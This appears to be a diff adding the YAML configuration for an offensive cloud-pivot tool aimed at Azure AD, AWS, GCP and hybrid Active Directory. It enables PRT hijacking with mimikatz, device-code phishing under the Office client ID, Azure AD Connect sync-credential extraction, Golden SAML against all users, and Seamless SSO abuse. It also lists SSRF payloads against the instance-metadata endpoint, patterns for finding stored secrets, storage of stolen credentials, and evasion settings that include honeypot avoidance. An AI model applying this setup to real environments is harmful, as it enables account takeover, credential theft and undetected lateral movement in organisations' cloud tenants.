@@ -1,0 +1,197 @@
+# =============================================================================
+# Cloud Pivot Configuration
+# Zero-Trust Bypass & Hybrid Lateral Movement
+# =============================================================================
+
+# Target cloud provider
+# Options: azure, aws, gcp, hybrid (multi-cloud)
+cloud_provider: azure
+
+# =============================================================================
+# AZURE AD CONFIGURATION
+# =============================================================================
+azure:
+  # Tenant ID (get from Azure Portal or dsregcmd /status)
+  tenant_id: ""
+  
+  # Target resources for token acquisition
+  target_resources:
+    - "https://graph.microsoft.com"
+    - "https://management.azure.com"
+    - "https://vault.azure.net"
+  
+  # PRT Hijacking settings
+  prt_hijack:
+    enabled: true
+    method: mimikatz  # mimikatz, roadtools, aadinternals
+    fallback_methods:
+      - roadtools
+      - device_code_phish
+  
+  # Device code phishing
+  device_code_phish:
+    enabled: true
+    client_id: "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # MS Office
+    resource: "https://graph.microsoft.com"
+    poll_timeout: 900  # seconds
+  
+  # Azure AD Connect exploitation
+  aadc_exploit:
+    enabled: true
+    auto_discover: true
+    extract_sync_creds: true
+  
+  # Golden SAML attack
+  golden_saml:
+    enabled: true
+    target_users: []  # Leave empty to target all
+  
+  # Seamless SSO abuse
+  seamless_sso:
+    enabled: true
+    computer_account: "AZUREADSSOACC$"
+
+# =============================================================================
+# AWS CONFIGURATION
+# =============================================================================
+aws:
+  # Default region for API calls
+  default_region: "us-east-1"
+  
+  # IMDS exploitation
+  imds:
+    # Try IMDSv1 first (easier, no token required)
+    try_v1_first: true
+    # Timeout for metadata requests
+    timeout: 5
+  
+  # SSRF relay settings
+  ssrf_relay:
+    enabled: true
+    # Known vulnerable endpoints to try
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://[::ffff:169.254.169.254]/"
+      - "http://169.254.169.254.nip.io/"
+  
+  # Role chaining
+  role_chain:
+    enabled: true
+    max_depth: 5  # Maximum AssumeRole chain depth
+  
+  # Credentials to look for in user-data
+  user_data_patterns:
+    - "AWS_ACCESS_KEY_ID"
+    - "AWS_SECRET_ACCESS_KEY"
+    - "password"
+    - "secret"
+    - "api_key"
+
+# =============================================================================
+# GCP CONFIGURATION
+# =============================================================================
+gcp:
+  # Service accounts to target
+  target_service_accounts:
+    - "default"
+    - "compute@developer.gserviceaccount.com"
+  
+  # Metadata exploitation
+  metadata:
+    timeout: 5
+    # Custom attributes to check for secrets
+    check_custom_attributes: true
+  
+  # Project enumeration
+  enumerate_projects: true
+
+# =============================================================================
+# HYBRID AD CONFIGURATION
+# =============================================================================
+hybrid:
+  # On-premises domain
+  domain: ""
+  domain_controller: ""
+  
+  # Azure AD Connect discovery
+  aadc_discovery:
+    enabled: true
+    # Search filter for sync accounts
+    sync_account_filter: "(|(userPrincipalName=MSOL_*)(userPrincipalName=Sync_*))"
+  
+  # ADFS settings for Golden SAML
+  adfs:
+    server: ""
+    extract_signing_cert: true
+  
+  # Pivot chain settings
+  pivot_chain:
+    # Start from on-prem, go to cloud
+    direction: "onprem_to_cloud"
+    # Methods to try in order
+    methods:
+      - prt_hijack
+      - aadc_exploit
+      - golden_saml
+      - device_code_phish
+
+# =============================================================================
+# ATTACK PATH SETTINGS
+# =============================================================================
+attack_paths:
+  # Stealth preference: low, medium, high
+  stealth_preference: medium
+  
+  # Auto-suggest paths based on current access
+  auto_suggest: true
+  
+  # Include weak credential analysis
+  analyze_weak_creds: true
+  
+  # MITRE ATT&CK mapping
+  include_mitre: true
+
+# =============================================================================
+# CREDENTIAL STORAGE
+# =============================================================================
+credentials:
+  # Store obtained credentials
+  store_credentials: true
+  
+  # Encryption for stored credentials
+  encrypt_storage: true
+  
+  # Auto-refresh expiring tokens
+  auto_refresh: true
+  refresh_threshold: 300  # seconds before expiry
+
+# =============================================================================
+# EVASION SETTINGS
+# =============================================================================
+evasion:
+  # Delay between requests (seconds)
+  request_delay: 0.5
+  
+  # Randomize user-agent
+  randomize_user_agent: true
+  
+  # Use proxy for requests
+  proxy:
+    enabled: false
+    http: ""
+    https: ""
+  
+  # Avoid known honeypots
+  honeypot_detection: true
+
+# =============================================================================
+# LOGGING
+# =============================================================================
+logging:
+  level: INFO
+  # Log file path
+  file: "logs/cloud_pivot.log"
+  # Include timestamps
+  timestamps: true
+  # Redact sensitive data in logs
+  redact_secrets: true
